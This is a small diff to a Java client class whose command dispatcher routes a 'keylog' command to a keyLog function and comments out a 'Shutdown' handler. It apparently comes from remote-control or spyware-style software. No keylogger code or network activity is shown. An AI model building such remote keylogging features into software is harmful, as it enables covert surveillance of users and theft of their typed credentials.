@@ -65,11 +65,11 @@ public class MainClient {
         else if (command.equalsIgnoreCase("keylog")) {
             return keyLog(id, Long.parseLong(parts[3].trim()));
         }
-        else if (command.equalsIgnoreCase("Shutdown")){
-            if (parts.length > 3)
-                return Shutdown(id,parts[3].trim());
-            return Shutdown(id,"");
-        }
+//        else if (command.equalsIgnoreCase("Shutdown")){
+//            if (parts.length > 3)
+//                return Shutdown(id,parts[3].trim());
+//            return Shutdown(id,"");
+//        }
         return false;
     }
 
